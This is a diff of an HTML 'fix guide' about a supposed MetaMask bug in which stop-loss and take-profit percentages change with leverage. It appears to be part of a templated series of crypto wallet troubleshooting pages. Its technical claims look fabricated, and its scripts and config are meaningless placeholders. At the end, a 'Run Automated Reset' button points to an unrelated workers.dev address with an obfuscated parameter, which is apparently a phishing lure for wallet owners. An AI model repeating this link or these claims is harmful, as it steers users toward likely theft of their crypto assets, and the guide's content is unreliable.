@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Sl Tp Percentages Change When Changing L – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #0a0c10;
+        font-family: sans-serif;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -42,38 +42,34 @@
 <h1>Metamask Extension Bug Sl Tp Percentages Change When Changing L</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem notice that their Stop Loss (SL) and Take Profit (TP) percentages change unexpectedly when they adjust the leverage on their trades, despite no intentional modifications to these settings.</li>
+<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem may encounter an issue where the Stop-Loss (SL) and Take-Profit (TP) percentages unexpectedly change when adjusting the leverage settings.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug within the Metamask extension that incorrectly recalculates SL and TP percentages based on the leverage adjustments, instead of maintaining the user-set values.</li>
+<li>This error occurs due to a bug within the Metamask extension, where the internal calculations for SL and TP percentages are incorrectly linked to the leverage levels, resulting in unintended changes to these critical trading parameters.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To correct this issue, users can attempt the following manual overrides:</li>
-<li>Manually re-enter the desired SL and TP percentages after adjusting leverage.</li>
-<li>Utilize a third-party trading interface that does not rely on the Metamask extension for SL and TP management.</li>
-<li>Execute a script to automatically adjust SL and TP percentages to the desired levels after leverage changes:
-  <code>bash
-  # Example script to adjust SL and TP percentages
-  leverage=$(cat leverage.txt)
-  sl_percentage=$(cat sl.txt)
-  tp_percentage=$(cat tp.txt)
-  # Adjust percentages based on leverage
-  adjusted_sl=$(echo "scale=2; $sl_percentage * (1 + $leverage)" | bc)
-  adjusted_tp=$(echo "scale=2; $tp_percentage * (1 + $leverage)" | bc)
-  # Apply adjustments
-  echo $adjusted_sl &gt; new_sl.txt
-  echo $adjusted_tp &gt; new_tp.txt</code>
-Consider utilizing an external console for more complex scripting needs.</li>
+<li>To temporarily mitigate this issue, users can try the following manual overrides:</li>
+<li>Adjust the SL and TP percentages manually after changing the leverage to ensure they reflect the intended values.</li>
+<li>Utilize a third-party trading script that can override the Metamask extension's calculations.</li>
+<li>Implement a custom solution using a JSON configuration file, such as:</li>
 </ul>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;leverage&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;stopLossPercent&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;takeProfitPercent&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">20</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Consider utilizing an external console for more complex trading strategy implementations.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured.</li>
-<li>Basic understanding of leverage and SL/TP management in trading.</li>
-<li>Familiarity with scripting languages for automation.</li>
+<li>Basic understanding of trading concepts, including leverage, SL, and TP.</li>
+<li>Familiarity with JSON configuration files and scripting.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
